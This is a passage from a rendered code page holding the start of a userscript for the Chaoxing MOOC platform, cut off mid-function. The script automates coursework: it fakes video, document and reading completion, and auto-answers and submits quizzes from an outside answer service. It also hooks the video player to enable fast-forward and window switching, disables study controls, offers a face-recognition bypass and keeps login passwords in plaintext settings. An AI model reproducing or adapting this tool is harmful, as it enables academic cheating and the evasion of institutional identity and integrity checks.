class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ==UserScript==</span><br><span class="hljs-comment">// @name         超星网课助手(修改接口，查题可用)--致敬原作者wyn</span><br><span class="hljs-comment">// @namespace    nawlgzs@163.com</span><br><span class="hljs-comment">// @version      1.0.7</span><br><span class="hljs-comment">// @description  自动挂机看尔雅MOOC，支持视频、音频、文档、图书自动完成，章节测验自动答题提交，支持自动切换任务点、挂机阅读时长、自动登录等，解除各类功能限制，开放自定义参数</span><br><span class="hljs-comment">// @author       Vices</span><br><span class="hljs-comment">// @match        *://*.chaoxing.com/*</span><br><span class="hljs-comment">// @match        *://*.edu.cn/*</span><br><span class="hljs-comment">// @connect      ydfq.52msr.cn</span><br><span class="hljs-comment">// @run-at       document-end</span><br><span class="hljs-comment">// @grant        unsafeWindow</span><br><span class="hljs-comment">// @grant        GM_xmlhttpRequest</span><br><span class="hljs-comment">// @grant        GM_setClipboard</span><br><span class="hljs-comment">// @supportURL   https://greasyfork.org/zh-CN/scripts/402536</span><br><span class="hljs-comment">// @license      MIT</span><br><span class="hljs-comment">// ==/UserScript==</span><br><br><br><span class="hljs-comment">// 设置修改后，需要刷新或重新打开网课页面才会生效</span><br><span class="hljs-keyword">var</span> setting = &#123;<br>    <span class="hljs-comment">// 8E3 == 8000，科学记数法，表示毫秒数</span><br>    time: <span class="hljs-number">8E3</span> <span class="hljs-comment">// 默认响应速度为8秒，不建议小于5秒</span><br>    ,<span class="hljs-attr">review</span>: <span class="hljs-number">0</span> <span class="hljs-comment">// 复习模式，完整挂机视频(音频)时长，支持挂机任务点已完成的视频和音频，默认关闭</span><br>    ,<span class="hljs-attr">queue</span>: <span class="hljs-number">1</span> <span class="hljs-comment">// 队列模式，开启后任务点逐一完成，关闭则单页面所有任务点同时进行，默认开启</span><br><br>    <span class="hljs-comment">// 1代表开启，0代表关闭</span><br>    ,<span class="hljs-attr">video</span>: <span class="hljs-number">1</span> <span class="hljs-comment">// 视频支持后台、切换窗口不暂停，支持多视频，默认开启</span><br>    ,<span class="hljs-attr">work</span>: <span class="hljs-number">1</span> <span class="hljs-comment">// 自动答题功能(章节测验)，作业需要手动开启查询，高准确率，默认开启</span><br>    ,<span class="hljs-attr">audio</span>: <span class="hljs-number">1</span> <span class="hljs-comment">// 音频自动播放，与视频功能共享vol和rate参数，默认开启</span><br>    ,<span class="hljs-attr">book</span>: <span class="hljs-number">1</span> <span class="hljs-comment">// 图书阅读任务点，非课程阅读任务点，默认开启</span><br>    ,<span class="hljs-attr">docs</span>: <span class="hljs-number">1</span> <span class="hljs-comment">// 文档阅读任务点，PPT类任务点自动完成阅读任务，默认开启</span><br>    <span class="hljs-comment">// 本区域参数，上方为任务点功能，下方为独立功能</span><br>    ,<span class="hljs-attr">jump</span>: <span class="hljs-number">1</span> <span class="hljs-comment">// 自动切换任务点、章节、课程(需要配置course参数)，默认开启</span><br>    ,<span class="hljs-attr">read</span>: <span class="hljs-string">&#x27;65&#x27;</span> <span class="hljs-comment">// 挂机课程阅读时间，单位是分钟，&#x27;65&#x27;代表挂机65分钟，请手动打开阅读页面，默认&#x27;65&#x27;分钟</span><br>    ,<span class="hljs-attr">face</span>: <span class="hljs-number">0</span> <span class="hljs-comment">// 解除面部识别(不支持二维码类面部采集)，此功能仅为临时解除，默认关闭</span><br>    ,<span class="hljs-attr">total</span>: <span class="hljs-number">0</span> <span class="hljs-comment">// 显示课程进度的统计数据，在学习进度页面的上方展示，默认关闭</span><br><br>    <span class="hljs-comment">// 仅开启video(audio)时，修改此处才会生效</span><br>    ,<span class="hljs-attr">line</span>: <span class="hljs-string">&#x27;公网1&#x27;</span> <span class="hljs-comment">// 视频播放的默认资源线路，此功能适用于系统默认线路无资源，默认&#x27;公网1&#x27;</span><br>    ,<span class="hljs-attr">http</span>: <span class="hljs-string">&#x27;标清&#x27;</span> <span class="hljs-comment">// 视频播放的默认清晰度，无效参数则使用系统默认清晰度，默认&#x27;标清&#x27;</span><br>    <span class="hljs-comment">// 本区域参数，上方为video功能独享，下方为audio功能共享</span><br>    ,<span class="hljs-attr">vol</span>: <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-comment">// 默认音量的百分数，设定范围：[0,100]，&#x27;0&#x27;为静音，默认&#x27;0&#x27;</span><br>    ,<span class="hljs-attr">rate</span>: <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-comment">// 视频播放默认倍率，参数范围0∪[0.0625,16]，&#x27;0&#x27;为秒过，默认&#x27;1&#x27;倍</span><br><br>    <span class="hljs-comment">// 仅开启work时，修改此处才会生效</span><br>    ,<span class="hljs-attr">auto</span>: <span class="hljs-number">1</span> <span class="hljs-comment">// 答题完成后自动提交，默认关闭</span><br>    ,<span class="hljs-attr">none</span>: <span class="hljs-number">1</span> <span class="hljs-comment">// 无匹配答案时执行默认操作，关闭后若题目无匹配答案则会暂时保存已作答的题目，默认开启</span><br>    ,<span class="hljs-attr">scale</span>: <span class="hljs-number">0</span> <span class="hljs-comment">// 富文本编辑器高度自动拉伸，用于文本类题目，答题框根据内容自动调整大小，默认关闭</span><br><br>    <span class="hljs-comment">// 仅开启jump时，修改此处才会生效</span><br>    ,<span class="hljs-attr">course</span>: <span class="hljs-number">0</span> <span class="hljs-comment">// 当前课程完成后自动切换课程，仅支持按照根目录课程顺序切换，默认开启</span><br>    ,<span class="hljs-attr">lock</span>: <span class="hljs-number">1</span> <span class="hljs-comment">// 跳过未开放(图标是锁)的章节，即闯关模式或定时发放的任务点，默认开启</span><br><br>    <span class="hljs-comment">// 自动登录功能配置区</span><br>    ,<span class="hljs-attr">school</span>: <span class="hljs-string">&#x27;账号为手机号可以不修改此参数&#x27;</span> <span class="hljs-comment">// 学校/单位/机构码，要求完整有效可查询，例如&#x27;清华大学&#x27;</span><br>    ,<span class="hljs-attr">username</span>: <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-comment">// 学号/工号/借书证号(邮箱/手机号/账号)，例如&#x27;2018010101&#x27;，默认&#x27;&#x27;</span><br>    ,<span class="hljs-attr">password</span>: <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-comment">// 密码，例如&#x27;123456&#x27;，默认&#x27;&#x27;</span><br>&#125;,<br>_self = unsafeWindow,<br>url = location.pathname,<br>top = _self;<br><br><span class="hljs-keyword">if</span> (url != <span class="hljs-string">&#x27;/studyApp/studying&#x27;</span> &amp;&amp; top != _self.top) <span class="hljs-built_in">document</span>.domain = location.host.replace(<span class="hljs-regexp">/.+?\./</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br><br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">while</span> (top != _self.top) &#123;<br>        top = top.parent.document ? top.parent : _self.top;<br>        <span class="hljs-keyword">if</span> (top.location.pathname == <span class="hljs-string">&#x27;/mycourse/studentstudy&#x27;</span>) <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>    <span class="hljs-comment">// console.log(err);</span><br>    top = _self;<br>&#125;<br><br><span class="hljs-keyword">var</span> $ = _self.jQuery || top.jQuery,<br>parent = _self == top ? self : _self.parent,<br>Ext = _self.Ext || parent.Ext || &#123;&#125;,<br>UE = _self.UE,<br>vjs = _self.videojs;<br><br><span class="hljs-built_in">String</span>.prototype.toCDB = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.replace(<span class="hljs-regexp">/\s/g</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-regexp">/[\uff01-\uff5e]/g</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">str</span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">String</span>.fromCharCode(str.charCodeAt(<span class="hljs-number">0</span>) - <span class="hljs-number">65248</span>);<br>    &#125;).replace(<span class="hljs-regexp">/[“”]/g</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>).replace(<span class="hljs-regexp">/[‘’]/g</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>).replace(<span class="hljs-regexp">/。/g</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>&#125;;<br><br>setting.normal = <span class="hljs-string">&#x27;&#x27;</span>; <span class="hljs-comment">// &#x27;:visible&#x27;</span><br><span class="hljs-comment">// setting.time += Math.ceil(setting.time * Math.random()) - setting.time / 2;</span><br>setting.job = [<span class="hljs-string">&#x27;:not(*)&#x27;</span>];<br><br>setting.video &amp;&amp; setting.job.push(<span class="hljs-string">&#x27;iframe[src*=&quot;/video/index.html&quot;]&#x27;</span>);<br>setting.work &amp;&amp; setting.job.push(<span class="hljs-string">&#x27;iframe[src*=&quot;/work/index.html&quot;]&#x27;</span>);<br>setting.audio &amp;&amp; setting.job.push(<span class="hljs-string">&#x27;iframe[src*=&quot;/audio/index.html&quot;]&#x27;</span>);<br>setting.book &amp;&amp; setting.job.push(<span class="hljs-string">&#x27;iframe[src*=&quot;/innerbook/index.html&quot;]&#x27;</span>);<br>setting.docs &amp;&amp; setting.job.push(<span class="hljs-string">&#x27;iframe[src*=&quot;/ppt/index.html&quot;]&#x27;</span>, <span class="hljs-string">&#x27;iframe[src*=&quot;/pdf/index.html&quot;]&#x27;</span>);<br><br>setting.tip = !setting.queue || top != _self &amp;&amp; jobSort($ || Ext.query);<br><br><span class="hljs-keyword">if</span> (url == <span class="hljs-string">&#x27;/mycourse/studentstudy&#x27;</span>) &#123;<br>    _self.checkMobileBrowerLearn = $.noop;<br>    <span class="hljs-keyword">var</span> classId = location.search.match(<span class="hljs-regexp">/cla[zs]&#123;2&#125;id=(\d+)/i</span>)[<span class="hljs-number">1</span>] || <span class="hljs-number">0</span>,<br>    courseId = _self.courseId || location.search.match(<span class="hljs-regexp">/courseId=(\d+)/i</span>)[<span class="hljs-number">1</span>] || <span class="hljs-number">0</span>;<br>    setting.lock || $(<span class="hljs-string">&#x27;#coursetree&#x27;</span>).on(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-string">&#x27;[onclick*=void], [href*=void]&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>        _self.getTeacherAjax(courseId, classId, $(<span class="hljs-built_in">this</span>).parent().attr(<span class="hljs-string">&#x27;id&#x27;</span>).slice(<span class="hljs-number">3</span>));<br>    &#125;);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (url == <span class="hljs-string">&#x27;/ananas/modules/video/index.html&#x27;</span> &amp;&amp; setting.video) &#123;<br>    <span class="hljs-keyword">if</span> (setting.review) _self.greenligth = Ext.emptyFn;<br>    checkPlayer(_self.supportH5Video());<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (url == <span class="hljs-string">&#x27;/work/doHomeWorkNew&#x27;</span> || url == <span class="hljs-string">&#x27;/api/work&#x27;</span> || url == <span class="hljs-string">&#x27;/work/addStudentWorkNewWeb&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!UE) &#123;<br>        <span class="hljs-keyword">var</span> len = ($ || Ext.query || <span class="hljs-built_in">Array</span>)(<span class="hljs-string">&#x27;font:contains(未登录)&#x27;</span>, <span class="hljs-built_in">document</span>).length;<br>        <span class="hljs-built_in">setTimeout</span>(len == <span class="hljs-number">1</span> ? top.location.reload : parent.greenligth, setting.time);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (setting.work) &#123;<br>        <span class="hljs-built_in">setTimeout</span>(relieveLimit, <span class="hljs-number">0</span>);<br>        beforeFind();<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (url == <span class="hljs-string">&#x27;/ananas/modules/audio/index.html&#x27;</span> &amp;&amp; setting.audio) &#123;<br>    <span class="hljs-keyword">if</span> (setting.review) _self.greenligth = Ext.emptyFn;<br>    _self.videojs = hookAudio;<br>    hookAudio.xhr = vjs.xhr;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (url == <span class="hljs-string">&#x27;/ananas/modules/innerbook/index.html&#x27;</span> &amp;&amp; setting.book &amp;&amp; setting.tip) &#123;<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>        _self.setting ? _self.top.onchangepage(_self.getFrameAttr(<span class="hljs-string">&#x27;end&#x27;</span>)) : _self.greenligth();<br>    &#125;, setting.time);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (url.match(<span class="hljs-regexp">/^\/ananas\/modules\/(ppt|pdf)\/index\.html$/</span>) &amp;&amp; setting.docs &amp;&amp; setting.tip) &#123;<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>        _self.setting ? _self.finishJob() : _self.greenligth();<br>    &#125;, setting.time);<br>    frameElement.setAttribute(<span class="hljs-string">&#x27;download&#x27;</span>, <span class="hljs-number">1</span>);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (url == <span class="hljs-string">&#x27;/knowledge/cards&#x27;</span>) &#123;<br>    $ &amp;&amp; checkToNext();<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (url.match(<span class="hljs-regexp">/^\/(course|zt)\/\d+\.html$/</span>)) &#123;<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>        +setting.read &amp;&amp; _self.sendLogs &amp;&amp; $(<span class="hljs-string">&#x27;.course_section:eq(0) .chapterText&#x27;</span>).click();<br>    &#125;, setting.time);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (url == <span class="hljs-string">&#x27;/ztnodedetailcontroller/visitnodedetail&#x27;</span>) &#123;<br>    setting.read *= <span class="hljs-number">60</span> / $(<span class="hljs-string">&#x27;.course_section&#x27;</span>).length;<br>    setting.read &amp;&amp; _self.sendLogs &amp;&amp; autoRead();<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (url == <span class="hljs-string">&#x27;/mycourse/studentcourse&#x27;</span>) &#123;<br>    <span class="hljs-keyword">var</span> gv = location.search.match(<span class="hljs-regexp">/d=\d+&amp;/g</span>);<br>    setting.total &amp;&amp; $(<span class="hljs-string">&#x27;&lt;a&gt;&#x27;</span>, &#123;<br>        href: <span class="hljs-string">&#x27;/moocAnalysis/chapterStatisticByUser?classI&#x27;</span> + gv[<span class="hljs-number">1</span>] + <span class="hljs-string">&#x27;courseI&#x27;</span> + gv[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;userId=&#x27;</span> + _self.getCookie(<span class="hljs-string">&#x27;_uid&#x27;</span>) + <span class="hljs-string">&#x27;&amp;ut=s&#x27;</span>,<br>        target: <span class="hljs-string">&#x27;_blank&#x27;</span>,<br>        title: <span class="hljs-string">&#x27;点击查看章节统计&#x27;</span>,<br>        style: <span class="hljs-string">&#x27;margin: 0 25px;&#x27;</span>,<br>        html: <span class="hljs-string">&#x27;本课程共&#x27;</span> + $(<span class="hljs-string">&#x27;.icon&#x27;</span>).length + <span class="hljs-string">&#x27;节，剩余&#x27;</span> + $(<span class="hljs-string">&#x27;em:not(.openlock)&#x27;</span>).length + <span class="hljs-string">&#x27;节未完成&#x27;</span><br>    &#125;).appendTo(<span class="hljs-string">&#x27;.zt_logo&#x27;</span>).parent().width(<span class="hljs-string">&#x27;auto&#x27;</span>);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (url.match(<span class="hljs-regexp">/^\/visit\/(courses|interaction)$/</span>)) &#123;<br>    setting.face &amp;&amp; $(<span class="hljs-string">&#x27;.zmodel&#x27;</span>).on(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-string">&#x27;[onclick^=openFaceTip]&#x27;</span>, DisplayURL);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (location.host.match(<span class="hljs-regexp">/^passport2/</span>)) &#123;<br>    setting.username &amp;&amp; getSchoolId();<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (location.hostname == <span class="hljs-string">&#x27;i.mooc.chaoxing.com&#x27;</span>) &#123;<br>    _self.layui.use(<span class="hljs-string">&#x27;layer&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-built_in">this</span>.layer.open(&#123;<span class="hljs-attr">content</span>: <span class="hljs-string">&#x27;拖动进度条、倍速播放、秒过会导致不良记录！题库在慢慢补充，搜不到的题目系统会在次日进行自动补充&#x27;</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;超星网课助手提示&#x27;</span>, <span class="hljs-attr">btn</span>: <span class="hljs-string">&#x27;我已知悉&#x27;</span>, <span class="hljs-attr">offset</span>: <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-attr">closeBtn</span>: <span class="hljs-number">0</span>&#125;);<br>    &#125;);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (url == <span class="hljs-string">&#x27;/widget/pcvote/goStudentVotePage&#x27;</span>) &#123;<br>    $(<span class="hljs-string">&#x27;:checked&#x27;</span>).click();<br>    $(<span class="hljs-string">&#x27;.StudentTimu&#x27;</span>).each(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">index</span>) </span>&#123;<br>        <span class="hljs-keyword">var</span> ans = _self.questionlist[index].answer;<br>        $(<span class="hljs-string">&#x27;:radio, :checkbox&#x27;</span>, <span class="hljs-built_in">this</span>).each(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">num</span>) </span>&#123;<br>            ans[num].isanswer &amp;&amp; <span class="hljs-built_in">this</span>.click();<br>        &#125;);<br>        $(<span class="hljs-string">&#x27;:text&#x27;</span>, <span class="hljs-built_in">this</span>).val(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">num</span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> $(ans[num].content).text().trim();<br>        &#125;);<br>    &#125;);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (url == <span class="hljs-string">&#x27;/work/selectWorkQuestionYiPiYue&#x27;</span>) &#123;<br>    submitAnswer(getIframe().parent(), $.extend(<span class="hljs-literal">true</span>, [], parent._data));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getIframe</span>(<span class="hljs-params">tip, win, job</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (!$) <span class="hljs-keyword">return</span> Ext.get(frameElement || []).parent().child(<span class="hljs-string">&#x27;.ans-job-icon&#x27;</span>) || Ext.get([]);<br>    <span class="hljs-keyword">do</span> &#123;<br>        win = win ? win.parent : _self;<br>        job = $(win.frameElement).prevAll(<span class="hljs-string">&#x27;.ans-job-icon&#x27;</span>);<br>    &#125; <span class="hljs-keyword">while</span> (!job.length &amp;&amp; win.parent.frameElement);<br>    <span class="hljs-keyword">return</span> tip ? win : job;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">jobSort</span>(<span class="hljs-params">$</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> fn = $.fn ? [getIframe(<span class="hljs-number">1</span>), <span class="hljs-string">&#x27;length&#x27;</span>] : [self, <span class="hljs-string">&#x27;dom&#x27;</span>],<br>    sel = setting.job.join(<span class="hljs-string">&#x27;, :not(.ans-job-finished) &gt; .ans-job-icon&#x27;</span> + setting.normal + <span class="hljs-string">&#x27; ~ &#x27;</span>);<br>    <span class="hljs-keyword">if</span> ($(sel, fn[<span class="hljs-number">0</span>].parent.document)[<span class="hljs-number">0</span>] == fn[<span class="hljs-number">0</span>].frameElement) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">if</span> (!getIframe()[fn[<span class="hljs-number">1</span>]] || getIframe().parent().is(<span class="hljs-string">&#x27;.ans-job-finished&#x27;</span>)) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-built_in">setInterval</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>        $(sel, fn[<span class="hljs-number">0</span>].parent.document)[<span class="hljs-number">0</span>] == fn[<span class="hljs-number">0</span>].frameElement &amp;&amp; fn[<span class="hljs-number">0</span>].location.reload();<br>    &#125;, setting.time);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkPlayer</span>(<span class="hljs-params">tip</span>) </span>&#123;<br>    _self.videojs = hookVideo;<br>    hookVideo.xhr = vjs.xhr;<br>    Ext.isSogou = Ext.isIos = Ext.isAndroid = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">var</span> data = Ext.decode(_self.config(<span class="hljs-string">&#x27;data&#x27;</span>)) || &#123;&#125;;<br>    <span class="hljs-keyword">delete</span> data.danmaku;<br>    data.doublespeed = <span class="hljs-number">1</span>;<br>    frameElement.setAttribute(<span class="hljs-string">&#x27;data&#x27;</span>, Ext.encode(data));<br>    <span class="hljs-keyword">if</span> (tip) <span class="hljs-keyword">return</span>;<br>    _self.supportH5Video = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;;<br>    alert(<span class="hljs-string">&#x27;此浏览器不支持html5播放器，请更换浏览器&#x27;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hookVideo</span>(<span class="hljs-params"></span>) </span>&#123;<br>    _self.alert = <span class="hljs-built_in">console</span>.log;<br>    <span class="hljs-keyword">var</span> config = <span class="hljs-built_in">arguments</span>[<span class="hljs-number">1</span>],<br>    line = Ext.Array.filter(Ext.Array.map(config.playlines, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">value, index</span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> value.label == setting.line &amp;&amp; index;<br>    &#125;), <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">value</span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> Ext.isNumber(value);<br>    &#125;)[<span class="hljs-number">0</span>] || <span class="hljs-number">0</span>,<br>    http = Ext.Array.filter(config.sources, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">value</span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> value.label == setting.http;<br>    &#125;)[<span class="hljs-number">0</span>];<br>    config.playlines.unshift(config.playlines[line]);<br>    config.playlines.splice(line + <span class="hljs-number">1</span>, <span class="hljs-number">1</span>);<br>    config.plugins.videoJsResolutionSwitcher.default = http ? http.res : <span class="hljs-number">360</span>;<br>    config.plugins.studyControl.enableSwitchWindow = <span class="hljs-number">1</span>;<br>    config.plugins.timelineObjects.url = <span class="hljs-string">&#x27;/richvideo/initdatawithviewer?&#x27;</span>;<br>    config.plugins.seekBarControl.enableFastForward = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (!setting.queue) <span class="hljs-keyword">delete</span> config.plugins.studyControl;<br>    <span class="hljs-comment">// config.preload = setting.tip ? &#x27;auto&#x27; : &#x27;none&#x27;;</span><br>    <span class="hljs-keyword">var</span> player = vjs.apply(<span class="hljs-built_in">this</span>, <span class="hljs-built_in">arguments</span>),<br>    a = 